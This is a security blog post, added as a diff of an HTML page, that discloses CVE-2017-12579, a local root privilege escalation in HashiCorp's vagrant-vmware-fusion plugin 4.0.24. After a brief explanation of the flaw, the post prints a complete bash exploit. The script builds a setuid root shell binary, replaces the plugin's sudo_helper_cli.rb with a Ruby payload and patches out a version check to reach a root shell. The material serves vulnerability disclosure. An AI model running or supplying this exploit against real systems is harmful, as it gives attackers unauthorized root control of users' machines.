@@ -1,0 +1,317 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+        <link rel="stylesheet" type="text/css" href="/css/style.css" />
+        <link rel="alternate" type="application/rss+xml" title="m4.rkw.io blog" href="http://m4.rkw.io/blog/rss" />
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+        <script src='https://www.google.com/recaptcha/api.js'></script>
+        <script src="/js/site.js"></script>
+        <title>Mark Wadham</title>
+    </head>
+    <body>
+        <div id="menu">
+                        <h3>Mark Wadham</h3>
+            <ul>
+                <li><a href="/index.html">profile</a></li>
+                <li><a href="/blog.html">blog</a> <a href="/blog/rss"><img src="/img/rss.png" /></a></li>
+                <li><a href="/cves.html">CVEs</a></li>
+                <li><a href="/jsdemos.html">js demos</a></li>
+                <li><a href="/contact.html">contact</a></li>
+                <li class="space small">twitter: <a href="https://twitter.com/m4rkw">m4rkw</a></li>
+                <li class="small">github: <a href="https://github.com/m4rkw">m4rkw</a></li>
+                <li class="small">linkedin: <a href="https://uk.linkedin.com/in/mark-wadham-14ab49a6">379069834</a></li>
+                <li class="red space small"></li>
+            </ul>
+
+        </div>
+        <div id="content">
+            <div id="main-content">
+                                            <div class="post">
+                <h2><a href="/blog/cve201712579-local-root-privesc-in-hashicorp-vagrantvmwarefusion-4024.html">CVE-2017-12579 Local root privesc in Hashicorp vagrant-vmware-fusion 4.0.24</a></h2>
+                <h3>18 Oct 2017 08:11  | <a class="tag" href="/blog/tag/macOS.html">macOS</a> | <a class="tag" href="/blog/tag/security.html">security</a> | <a class="tag" href="/blog/tag/exploits.html">exploits</a></h3>
+                  <pre>I have previously disclosed a couple of bugs in Hashicorp&#39;s
+vagrant-vmware-fusion plugin for vagrant.
+
+Unfortunately the 4.0.23 release which was supposed to fix the previous bug I
+reported didn&#39;t address the issue, so Hashicorp quickly put out another release
+- 4.0.24 - after that (but didn&#39;t update the public changelog on github).
+
+Unfortunately 4.0.24 is still vulnerable, largely due to a fundamental design
+flaw in the way the plugin is written combined with the need to elevate
+privileges for certain functions within Fusion.
+
+Because Hashicorp need users to be able to update the plugin as the local
+non-root user the encrypted ruby code that the plugin is comprised of must
+remain owned by the non-root user. This means there is a huge attack surface
+that we can exploit to manipulate the execution of the program and still get
+root on 4.0.24.
+
+I wrote this exploit before Fusion 10 was released and on the surface 4.0.24 is
+not compatible with Fusion 10. Curiously though it can be fairly easily tricked
+into working (at least partially) with Fusion 10 simply by patching out the
+version check and creating a symlink. I discovered this while trying to get the
+4.0.24 exploit working with Fusion 10 installed - we can simply monkey-patch
+the version check out of the code, create a symlink for a binary that VMWare
+moved in v10 and then we&#39;re away. I was able to vagrant up and ssh into the
+running vm without any issues. It also means I was able to update the exploit so
+that it works on Fusion 8.x and Fusion 10.
+
+This seems to be (finally!) fixed properly in 4.0.25 by replacing the suid
+helper binary with a new go binary that contains all the required elevated
+operations and doesn&#39;t call back to the vulnerable ruby code.
+
+<a href="https://m4.rkw.io/vagrant_vmware_privesc_4.0.24_v8-10.sh.txt">https://m4.rkw.io/vagrant_vmware_privesc_4.0.24_v8-10.sh.txt</a>
+30d54139620bf8e805805d34aa54f4f348b7371642828b28cd0f8c5a7a65c0e8
+-----------------------------------------------------------------------------
+#!/bin/bash
+echo
+echo &quot;**********************************************************&quot;
+echo &quot;* vagrant_vmware_fusion plugin 4.0.24 local root privesc *&quot;
+echo &quot;* by m4rkw - <a href="https://m4.rkw.io/blog.html                 *&quot">https://m4.rkw.io/blog.html                 *&quot</a>;
+echo &quot;**********************************************************&quot;
+echo &quot;* works against vmware fusion 8.x and 10.x - even though *&quot;
+echo &quot;* 4.0.24 is not compatible with 10.x, we patch out the   *&quot;
+echo &quot;* version check ;)                                       *&quot;
+echo &quot;**********************************************************&quot;
+echo
+
+cleanup() {
+  exec 2&gt; /dev/null
+  killall -9 vagrant 1&gt;/dev/null 2&gt;/dev/null
+  kill -9 `ps auxwww |egrep &#39;\/vagrant up$&#39; |xargs -L1 |cut -d &#39; &#39; -f2` &amp;&gt;/dev/null
+  exec 2&gt; /dev/tty
+  x=`pwd |sed &#39;s/.*\///&#39;`
+  if [ &quot;$x&quot; == &quot;.vagrant_vmware_fusion_4024_exp&quot; ] ; then
+    cd ..
+    rm -rf .vagrant_vmware_fusion_4024_exp
+  fi
+  cd
+  rm -rf .vagrant_vmware_fusion_4024_exp
+  if [ -e &quot;$target1.bak&quot; ] ; then
+    mv -f $target1.bak $target1
+  fi
+  if [ -e &quot;$target2.orig&quot; ] ; then
+    mv -f $target2.orig $target2
+  fi
+}
+
+vuln=`find ~/.vagrant.d//gems/2.3.4/gems/vagrant-vmware-fusion-4.0.24/bin -type f -perm +4000`
+
+if [ &quot;$vuln&quot; == &quot;&quot; ] ; then
+  echo &quot;Vulnerable suid binary not found. It gets +s after the first vagrant up.&quot;
+  exit 1
+fi
+
+mkdir .vagrant_vmware_fusion_4024_exp
+cd .vagrant_vmware_fusion_4024_exp
+
+echo &quot;Looking for a vmware_desktop vagrant box ...&quot;
+
+box=`vagrant box list |grep &#39;(vmware_desktop&#39; |head -n1 |cut -d &#39; &#39; -f1`
+
+download=0
+
+if [ &quot;$box&quot; == &quot;&quot; ] ; then
+  download=1
+  echo &quot;No box found, defaulting to envimation/ubuntu-xenial ...&quot;
+  box=&quot;envimation/ubuntu-xenial&quot;
+fi
+
+echo &quot;Writing a dummy vagrantfile ...&quot;
+
+cat &gt; vagrantfile &lt;&lt;EOF
+Vagrant.configure(&#39;2&#39;) do |config|
+  config.vm.box = &#39;$box&#39;
+end
+EOF
+
+echo &quot;Compiling the shell invoker ...&quot;
+
+cat &gt; /tmp/v.c &lt;&lt;EOF2
+#include &lt;unistd.h&gt;
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-c&quot;,&quot;rm -f /tmp/v; /bin/bash&quot;,NULL);
+  return 0;
+}
+EOF2
+gcc -o /tmp/v /tmp/v.c
+rm -f /tmp/v.c
+
+echo &quot;Looking for the sudo_helper_cli.rb ...&quot;
+
+target1=`find ~/.vagrant.d/ -name sudo_helper_cli.rb |grep vagrant-vmware-fusion-4.0.24`
+
+if [ $target1 == &quot;&quot; ] ; then
+  cleanup
+  echo &quot;sudo_helper_cli.rb version 4.0.24 not found&quot;
+  exit 1
+fi
+
+echo &quot;Installing ruby payload ...&quot;
+
+if [ ! -e &quot;$target1.bak&quot; ] ; then
+  mv -f $target1 $target1.bak
+  if [ ! $? -eq 0 ] ; then
+    cleanup
+    echo &quot;Unable to rename $target1, may not be exploitable.&quot;
+    exit 1
+  fi
+fi
+
+cat &gt; $target1 &lt;&lt;EOF
+#!/usr/bin/env ruby
+class HashiCorp::VagrantVMwarefusion::SudoHelperCLI
+  def run(x)
+    \`chown root:wheel /tmp/v\`
+    \`chmod 4755 /tmp/v\`
+  end
+end
+EOF
+
+if [ ! $? -eq 0 ] ; then
+  cleanup
+  echo &quot;Unable to write to $target1, may not be exploitable.&quot;
+  exit 1
+fi
+
+vc=`/Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx -v 2&gt;&amp;1 |grep &#39;VMware Fusion 10.&#39;`
+
+if [ &quot;$vc&quot; != &quot;&quot; ] ; then
+  echo &quot;Fusion 10.x detected, Patching out the version check ...&quot;
+
+  target2=`find ~/.vagrant.d/ -name driver.rb |grep vagrant-vmware-fusion-4.0.24`
+
+  if [ &quot;$target2&quot; == &quot;&quot; ] ; then
+    cleanup
+    echo &quot;driver.rb version 4.0.24 not found&quot;
+    exit 1
+  fi
+
+  if [ ! -e &quot;$target2.orig&quot; ] ; then
+    mv -f $target2 $target2.orig
+    if [ ! $? -eq 0 ] ; then
+      cleanup
+      echo &quot;Unable to rename $target2, may not be exploitable.&quot;
+      exit 1
+    fi
+  fi
+
+  cat &gt; $target2 &lt;&lt;EOF
+load File.dirname(__FILE__) + &quot;/driver.rb.orig&quot;
+
+module DriverVersionHack
+  def verify!
+  end
+end
+
+class HashiCorp::VagrantVMwarefusion::Driver::Fusion
+  prepend DriverVersionHack
+end
+EOF
+fi
+
+echo &quot;Triggering vagrant up ...&quot;
+
+vagrant up &amp;&gt;/dev/null &amp;
+
+success=0
+
+
+if [ $download -eq 1 ] ; then
+  echo &quot;*** we need to download the vmware box so this will take a minute or two ***&quot;
+fi
+
+echo &quot;Waiting for payload to trigger ...&quot;
+
+count=0
+
+while :
+do
+  r=`ls -la /tmp/v |grep -- &#39;-rwsr-xr-x  1 root  wheel&#39;`
+  if [ &quot;$r&quot; != &quot;&quot; ] ; then
+    success=1
+    break
+  fi
+  r=`ps auxwww |egrep &#39;\/vagrant up$&#39;`
+  if [ &quot;$r&quot; == &quot;&quot; ] ; then
+    break
+  fi
+  sleep 0.2
+  count=$(($count + 1))
+  if [ $count -eq 150 ] ; then
+    echo &quot;Timed out waiting for the payload to trigger.&quot;
+    cleanup
+    exit 1
+  fi
+done
+
+cleanup
+
+if [ ! $success -eq 1 ] ; then
+  echo &quot;Exploit failed.&quot;
+  exit 1
+fi
+
+echo
+
+/tmp/v</pre>
+            </div>
+
+
+            </div>
+            <div id="right-content">
+                
+            <ul>
+              <li>&nbsp;&nbsp;<a href="/blog.html">all posts</a>
+            </ul>
+
+            <ul>
+              <li>&nbsp;&nbsp;[year]</li>
+                <li>&nbsp;&nbsp;<a href="/blog/2020.html">2020</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2019.html">2019</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2018.html">2018</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2017.html">2017</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2016.html">2016</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/2015.html">2015</a></li>
+            </ul>
+
+            <ul>
+              <li>&nbsp;&nbsp;[tag]</li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/AWS.html">AWS</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/agile.html">agile</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/apple.html">apple</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/bash.html">bash</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/cryptocurrency.html">cryptocurrency</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/development.html">development</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/exploits.html">exploits</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/iOS.html">iOS</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/linux.html">linux</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/macOS.html">macOS</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/mining.html">mining</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/mysql.html">mysql</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/php.html">php</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/ruby.html">ruby</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/scrum.html">scrum</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/security.html">security</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/touchID.html">touchID</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/vim.html">vim</a></li>
+                <li>&nbsp;&nbsp;<a href="/blog/tag/work.html">work</a></li>
+            </ul>
+
+            </div>
+        </div>
+				<script>
+						(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+						(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+						m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+						})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+						ga('create', 'UA-91604161-1', 'auto');
+						ga('send', 'pageview');
+				</script>
+    </body>
+</html>
